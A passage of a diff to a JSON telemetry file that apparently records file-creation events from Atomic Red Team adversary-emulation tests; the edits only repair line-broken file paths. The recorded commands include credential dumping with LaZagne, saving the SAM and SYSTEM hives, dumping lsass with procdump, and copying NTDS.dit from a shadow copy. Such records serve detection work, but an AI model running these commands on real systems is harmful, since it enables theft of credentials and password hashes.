         "key": "7b927bb99dbf8444e14184b3d5add6df"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nhashlib.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_hashlib.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "914974dee2e24603c54d9c2378c3b238"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_\\\nctypes.pyd\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/_MEI73082/_ctypes.pyd\"",
         "cmd": "lazagne1.exe  browsers",
         "id": "4b1d560f1821ad43a18427b64366b8fa",
         "key": "9f6526f1c894071e174269a5f57fe2e7"
     },
     {
-        "filename": "  C:/users/admini~1/appdata/local/temp/\\\ntthwwf\"",
+        "filename": "  C:/users/admini~1/appdata/local/temp/tthwwf\"",
         "cmd": "reg.exe  save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf",
         "id": "e1a1cb04ed4d69f7ad8bc98fbafbf696",
         "key": "af1b52f949eebff99f91b25af8ed26b5"
@@ -1230,19 +1230,19 @@
         "key": "fb33d8608dc18c13d031d4c25a9e709c"
     },
     {
-        "filename": "  C:/Program Files (x86)/Windows Kits/8.1/Debuggers/x64/\\\ndbghelp.dll\"",
+        "filename": "  C:/Program Files (x86)/Windows Kits/8.1/Debuggers/x64/dbghelp.dll\"",
         "cmd": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
         "id": "5c1f1ec6667430a87316f608d94b08fb",
         "key": "415595c7917b02f0055b4d1f7550f615"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.cmdline",
         "id": "08d25a86c839fc0abb3d9d3a488f9383",
         "key": "17ecdbf297cef29f5cfcf38cd6e64743"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRES1013.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RES1013.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES1013.tmp   c:/Users/Administrator/AppData/Local/Temp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP",
         "id": "c8b1e89c62ea01bd4a3e154bd8affc83",
         "key": "c5895963682d95fc857e1ea680663578"
@@ -1254,55 +1254,55 @@
         "key": "aa179f05549c55c2e877195042d14a52"
     },
     {
-        "filename": "  C:/Device/HarddiskVolumeShadowCopy1/\\\nWindows/System32/config/SYSTEM\"",
+        "filename": "  C:/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM\"",
         "cmd": "cmd.exe  /c  copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/NTDS.dit C:/Windows/Temp/ntds.dit &amp; copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/Windows/Temp/VSC_SYSTEM_HIVE &amp; reg save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
         "id": "47ea676812bf207d3e3140c251b3ad50",
         "key": "b67a538855f6efde0d95e690b8c914f3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/c10mxv53/c10mxv53.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.out\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "1d7f654e115ef7f7a9118b2ddfa88aff"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/c10mxv53/c10mxv53.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.0.cs\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "29d04d3308ea5203fd9c96174eb82e77"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_dogokwgd.vcc.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_dogokwgd.vcc.psm1\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "773f7a39d2f150d02f6161825a0ddaa6"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_iwwppbij.1gu.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_iwwppbij.1gu.ps1\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "8e0785551ac1f849ef19b9ebd77c7e01"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/c10mxv53/c10mxv53.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.cmdline\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "a68017feda4100a9ae244eeb7e57694a"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/c10mxv53/c10mxv53.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.dll\"",
         "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
         "id": "838dfffb7a13305b19bea3a8a072cafd",
         "key": "c28212b1c756acf85f5486b756f36fd8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.cmdline",
         "id": "24e5e152c70094f669e74bec8a230515",
         "key": "4a7b6711278c32c123e9535071d99f52"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESF4B2.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESF4B2.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF4B2.tmp   c:/Users/Administrator/AppData/Local/Temp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP",
         "id": "bef84199ca8703a9473406793315189c",
         "key": "8c76ceef6e8ad63358df900f4199b4b6"
@@ -1320,25 +1320,25 @@
         "key": "1ed4d9ec099169c3535d493fe5095e80"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.cmdline",
         "id": "6c4361384f1f6b011437ceba342ec0d2",
         "key": "93cb1d1b7c7ec87caca2ed906f28381c"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRES3C0B.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RES3C0B.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES3C0B.tmp   c:/Users/Administrator/AppData/Local/Temp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP",
         "id": "9a71b6f5d23c9ccdd901b3cfad8aa8d3",
         "key": "35ebe7f6836d4eb91a3e41884040cace"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/shell/\\\nT1022.zip.tmp\"",
+        "filename": "  C:/Users/Administrator/Desktop/shell/T1022.zip.tmp\"",
         "cmd": "7z.exe  a -tzip T1022.zip C://Users/Administrator/Desktop/T1022",
         "id": "15094515321e9a167576fb6c4f3c433f",
         "key": "3a70148a130b7f9c4f4f83e71c7ec143"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/shell/\\\nT1022.zip\"",
+        "filename": "  C:/Users/Administrator/Desktop/shell/T1022.zip\"",
         "cmd": "7z.exe  a -tzip T1022.zip C://Users/Administrator/Desktop/T1022",
         "id": "15094515321e9a167576fb6c4f3c433f",
         "key": "a97ec7d93c2432cdbd003fd83717ddc4"
@@ -1356,151 +1356,151 @@
         "key": "745e58ef12ed90565c6f920b7e211e99"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_2yzziv1l.5wz.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_2yzziv1l.5wz.psm1\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "11b3a085126c4614bf52dfe4555edcb2"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_r2dyz1fz.400.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_r2dyz1fz.400.ps1\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "30be0487d0e917becc47ffe05e5e1c34"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/System.Serv759bfb78#/e60010dfab1e29d716cad4adc1df496c/System.ServiceProcess.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/System.Serv759bfb78#/e60010dfab1e29d716cad4adc1df496c/System.ServiceProcess.ni.dll.aux\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "4221fb069384ac3db4ef28d9bbb89ec3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/dlshnqqn/dlshnqqn.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.out\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "456c24757af67ff32f5ab405e042258f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/dlshnqqn/dlshnqqn.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.cmdline\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "6fc8ede4e09f1ea077f11afc75c2b295"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/dlshnqqn/dlshnqqn.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.dll\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "846a4a7b1196b39ab6ff6deeb50dc727"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/T1119_2.txt\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/T1119_2.txt\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "892d5175dcb20d58f052c31ed2776da6"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/T1119_3.txt\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/T1119_3.txt\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "8bcd1e435cc899fbd03bec2a907c154f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/T1119_1.txt\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/T1119_1.txt\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "a2ebc3a43b7add6d04ba8f3de6c5c986"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/dlshnqqn/dlshnqqn.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.0.cs\"",
         "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
         "id": "35539842b904d5cea2881cce0f9381a0",
         "key": "d4aea87a32bed5c3d858ec6ae5446fea"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.cmdline",
         "id": "848d27c9a2e82cf8607331bbfaf73e4c",
         "key": "3809a3eb1e495da44d1406074232d0e8"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESE377.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESE377.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE377.tmp   c:/Users/Administrator/AppData/Local/Temp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP",
         "id": "7b8aaade18faecc9db7a92855ca0216b",
         "key": "9553dd45f4057990778e3645bae55066"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nT1119_1.txt\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/T1119_1.txt\"",
         "cmd": "sc  query type=service",
         "id": "28df61e34c38cf8bb31057719bd71c36",
         "key": "177f6f88faddb9b40a842b52b61506d5"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nT1119_4.txt\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/T1119_4.txt\"",
         "cmd": "tree  C:/AtomicRedTeam/atomics",
         "id": "2c315afbb87bf1f8a4d76b6b092c4c32",
         "key": "73f0ee4bdfca48e0dc60d5ae47200d04"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nT1119_3.txt\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/T1119_3.txt\"",
         "cmd": "wmic  process list",
         "id": "642537170a52f6f56dc48c72963d8d9a",
         "key": "2c364ff27f6efab9a94249bc6f667322"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.cmdline",
         "id": "61e7e2b9aebf24de1b03546d553ac07b",
         "key": "206684707536406d0dc613f84410e104"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESDD4D.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESDD4D.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESDD4D.tmp   c:/Users/Administrator/AppData/Local/Temp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP",
         "id": "a0189eac0beac9dd051a62686fe3ee9e",
         "key": "9eb9719cb499d3b169f2c67ff0f0d3b2"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/gpflxjkd/gpflxjkd.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.cmdline\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "00939ffbad4e235c446f09cca2126838"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/gpflxjkd/gpflxjkd.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.dll\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "38f9d59b7d92b32866a6bb4767b70d57"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/gpflxjkd/gpflxjkd.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.out\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "45e0412646136e76462ae552292eb401"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_0zyy5ekm.12e.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_0zyy5ekm.12e.ps1\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "91006faf22ca0ceefb39b4c1fa08184a"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_0uvskel4.1b5.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_0uvskel4.1b5.psm1\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "9d7297daf95b9a11200d7371b5910f82"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/gpflxjkd/gpflxjkd.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.0.cs\"",
         "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
         "id": "af78bca578b8af6cbb0c48f6982bb3c4",
         "key": "d91eae73dec0aec792cda17291a0e104"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.cmdline",
         "id": "f80dace5b1042f612172106625c4b235",
         "key": "81c0bb5ff3a8731505721c2aa5ab9865"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRESE173.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RESE173.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE173.tmp   c:/Users/Administrator/AppData/Local/Temp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP",
         "id": "d259f8d37e7f8146c5ae2e8913d0e27d",
         "key": "a0a0ff9453b8590d0fb10bef075d8907"
